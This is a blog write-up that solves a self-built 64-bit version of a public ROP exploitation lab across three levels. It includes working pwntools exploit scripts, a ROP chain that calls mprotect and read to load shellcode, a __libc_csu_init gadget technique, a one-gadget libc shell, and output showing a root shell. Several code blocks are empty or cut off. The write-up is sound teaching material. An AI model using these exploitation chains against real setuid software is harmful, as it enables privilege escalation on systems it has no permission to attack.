It turns out I've been blogging for 6 years as of today. To celebrate, here's a writeup on 64-bit ROP exploitation! It's a revist of [barrebas's](https://twitter.com/barrebas) awesome ROP primer, but compiled for 64-bit. This isn't an official boot2root, just something I decided to do on my own for fun. barrebas provides the source code for each of the challenges in his [ROP Primer](https://www.vulnhub.com/entry/rop-primer-02,114/) so it's just a matter of compiling it on a 64-bit system. 

### Setup

The binaries can be found at [https://gist.github.com/superkojiman/b28c801a3b042072bc69](https://gist.github.com/superkojiman/b28c801a3b042072bc69). Here's my setup in case you want to follow along: 

```bash
# mkdir 0 1 2
# echo 'flag{challenge-completed}' > flag
# chmod 600 flag
# cp level0 flag 0
# cp level1 flag 1
# cp level2 flag 2
# chown -R root:root 0 1 2
# chmod 4755 0/level0
# chmod 4755 1/level1
```

This gives the following directory structure:

```text
# tree -p .
.
├── [drwxr-xr-x]  0
│   ├── [-rw-------]  flag
│   └── [-rwsr-xr-x]  level0
├── [drwxr-xr-x]  1
│   ├── [-rw-------]  flag
│   └── [-rwxr-xr-x]  level1
└── [drwxr-xr-x]  2
    ├── [-rw-------]  flag
    └── [-rwsr-xr-x]  level2

3 directories, 6 files
```

I also kept ASLR on for challenges 0, and 1.

### Level 0

level0 prompts the user for input and uses gets() to store the input into a buffer. RIP is at offset 40. Here's what the stack looks like right before RIP is overwritten with 0x424242424242:

Here's a layout of the process' memory:

```

0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```

In my 32-bit solution, a stack pointer was conveniently found in one of the registers, but not so in this case. Fortunately the binary's addresses don't change, so I just have to call mprotect on it to make it executabe, read my shellcode into said memory, and then return to it to get a shell. 

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*40

# make location 0x6b6000 to 0x6b8000 RWX using mprotect
# mprotect:
#   rax: 0xa
#   rdi: unsigned long start
#   rsi: size_t len
#   rdx: unsigned long prot

buf += p64(0x40159b)        # pop rdi; ret; 
buf += p64(0x6b6000)        # unsigned long start
buf += p64(0x432f29)        # pop rdx; pop rsi; ret; 
buf += p64(7)               # unsigned long prot
buf += p64(8192)            # size_t len
buf += p64(0x414796)        # add eax, 5; ret; 
buf += p64(0x414796)        # add eax, 5; ret; 
buf += p64(0x4546b5)        # syscall; ret; 

# read shellcode into 0x6b6000
# read:
#   rax: 0x0
#   rdi: unsigned int fd
#   rsi: char *buf
#   rdx: size_t count

buf += p64(0x40159b)        # pop rdi; ret; 
buf += p64(0)               # unsigned int fd
buf += p64(0x432f29)        # pop rdx; pop rsi; ret; 
buf += p64(30)              # size_t count
buf += p64(0x6b6000)        # char *buf
buf += p64(0x43168d)        # pop rax; ret; 
buf += p64(0)               # sys_read
buf += p64(0x4546b5)        # syscall; ret; 

buf += p64(0x6b6000)        # return to read-in shellcode
print buf
```

I also created a python script to send an execve shellcode to the binary when it calls read:

```python
from pwn import *
context(os="linux", arch="amd64")
print asm(shellcraft.linux.sh())
```

Here it is in action:

```text
$ (./sploit.py; ./sc.py; cat) | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@!
whoami
root
cat flag
flag{challenge-completed}
```

So far so good!

### Level 1

Things get a bit hairy in this level. level1 listens on port 8888 for connections and prompts us for input. It's easy to overflow the handle_conn() function and gain control of RIP using the store command. In my case, I specified a file size of 500 bytes and sent an input file of 800 bytes. RIP gets overwritten at offset 572.  Here's what the stack looks like right before it returns to an invalid address: 

```

```

The description of the challenge hints that we can use open(), read(), and write() to get the flag. So much like the 32-bit solution, I solved it using ret2plt. Unlike the 32-bit solution however, this turned out to be more complicated. In 64-bit binaries, the first six function parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. Anything more is passed on the stack. In order to return to open@plt, read@plt, and write@plt, I needed to populate these registers with the proper values. Unlike level0, this is a dynamically linked binary so I had limited gadgets to work with. Fortunately, I can get everything I need from \_\_libc\_csu\_init() as described [here](http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html). 

Here's a breakdown of \_\_libc\_csu\_init():

```

|      ||   0x004010d9    41ff14dc       call qword [r12 + rbx*8]       ; hurdle #1
|      ||   0x004010dd    4883c301       add rbx, 1
|      ||   0x004010e1    4839eb         cmp rbx, rbp                   ; hurdle #2
|      `==< 0x004010e4    75ea           jne 0x4010d0                 
|       `-> 0x004010e6    4883c408       add rsp, 8
|           0x004010ea    5b             pop rbx
|           0x004010eb    5d             pop rbp
|           0x004010ec    415c           pop r12
|           0x004010ee    415d           pop r13                        ; set r13 which gets copied to rdx (see above)
|           0x004010f0    415e           pop r14                        ; set r14 which gets copied to rsi (see above)
|           0x004010f2    415f           pop r15                        ; set r15 which gets copied to edi (see above)
\           0x004010f4    c3             ret
```

Based on the above, if I returned to 0x004010ee, I could pop values into registers r13, r14, and r15. I could then return to 0x004010d0, which would copy the values from registers r13, r14, and r15, into registers rdx, rsi, and edi respectively. Once rdi, rsi, and edi are populated, execution continues until it reaches the ret instruction. In order to get there, the two hurdles pointed out above need to be overcome. 

Hurdle #1 is a call to a function pointer. 

```
|      ||   0x004010d9    41ff14dc       call qword [r12 + rbx*8]
```

I control both r12 and rbx, so I can control which function pointer gets called. _fini() is a good choice. Here's what it looks like:

```
[0x00400a00]> pdf@sym._fini
/ (fcn) sym._fini 9
|           ;-- section..fini:
|           0x00401104    4883ec08       sub rsp, 8 
|           0x00401108    4883c408       add rsp, 8
\           0x0040110c    c3             ret
```

\_fini() is at 0x00401104 and a pointer to it can be found in &\_DYNAMIC:

```
gdb-peda$ x/11wx &_DYNAMIC 
0x6015d0:   0x00000001  0x00000000  0x00000001  0x00000000
0x6015e0:   0x0000000c  0x00000000  0x00400848  0x00000000
0x6015f0:   0x0000000d  0x00000000  0x00401104  <--- here's _fini()
```

The pointer to _fini() is at 0x6015f8. Just to make sure: 

```
gdb-peda$ x/3i *0x6015f8
   0x401104 <_fini>:    sub    rsp,0x8
   0x401108 <_fini+4>:  add    rsp,0x8
   0x40110c <_fini+8>:  ret
```

So to overcome this first hurdle, I just had to set r12 to 0x6015f8, and rbx to 0. 

Hurdle #2 is much easier to overcome. I just need to make sure rbx and rbp are equal:

```
|      ||   0x004010dd    4883c301       add rbx, 1
|      ||   0x004010e1    4839eb         cmp rbx, rbp
|      `==< 0x004010e4    75ea           jne 0x4010d0                 
|       `-> 0x004010e6    4883c408       add rsp, 8
```

I control both rbx and rbp, so I just set rbx to 0, and rbp to 1. By the time the comparison is made, both registers equal to 1. 

After both hurdles are passed, the sequence of pop instructions that populate r13, r14, and r15 are called again. I took this opportunity to fill them with the proper values to be copied to rdx, rsi, and edi for the next function call to be chained. Here's the final exploit:

```python
#!/usr/bin/env python

Hopefully that wasn't too confusing. Here's the exploit in action:

Got the flag. Moving on to the final challenge. 

### Level 2

I had to cheat on this one a bit by turning off ASLR. Due to the nature of addressing on 64-bit systems, null bytes become a really big problem. For this particular challenge, it's easy to overwrite RIP, but I could only return to a single gadget due to the null bytes. The gadget I picked is a one-gadget-RCE from libc that executes execve("/bin/sh") to give me an instant shell. Using Hopper, I searched for references to "/bin/sh" that was followed by a call to execve(). I picked this one: 

```
00000000000d48e7         mov        rax, qword [ds:0x3a2ea8]
00000000000d48ee         lea        rsi, qword [ss:rsp+var_168]
00000000000d48f3         lea        rdi, qword [ds:0x161160]                    ; "/bin/sh"
00000000000d48fa         mov        rdx, qword [ds:rax]
00000000000d48fd         call       execve
```

Since ASLR is disabled, libc's base address won't change during execution. So adding the offset 0xd48e7 to libc's base address gives me the address I need to return to. First off, I needed libc's base address: 

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /root/rop64/2/level2
0x00600000         0x00601000         rw-p  /root/rop64/2/level2
0x00007ffff7a33000 0x00007ffff7bd2000 r-xp  /lib/x86_64-linux-gnu/libc-2.19.so
.
.
.
```

Next add the offset and make sure I'm getting the same instructions I got from Hopper: 

```
gdb-peda$ x/10i 0xd48e7 + 0x00007ffff7a33000
   0x7ffff7b078e7 <exec_comm+1767>: mov    rax,QWORD PTR [rip+0x2ce5ba]        # 0x7ffff7dd5ea8
   0x7ffff7b078ee <exec_comm+1774>: lea    rsi,[rsp+0x70]
   0x7ffff7b078f3 <exec_comm+1779>: lea    rdi,[rip+0x8c866]        # 0x7ffff7b94160
   0x7ffff7b078fa <exec_comm+1786>: mov    rdx,QWORD PTR [rax]
   0x7ffff7b078fd <exec_comm+1789>: call   0x7ffff7aeaae0 <__execve>
```

Looks good! So I just need return to 0x7ffff7b078e7 to get my shell. Here's the final exploit: 

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*40
buf += p64(0x7ffff7b078e7)
print buf
```

And now here it is in action:

All done! 

Hope you guys enjoyed this writeup. If you're interested in learning some 64-bit ROP exploitation, give this a go. It's not too hard and you might learn a thing or two along the way.
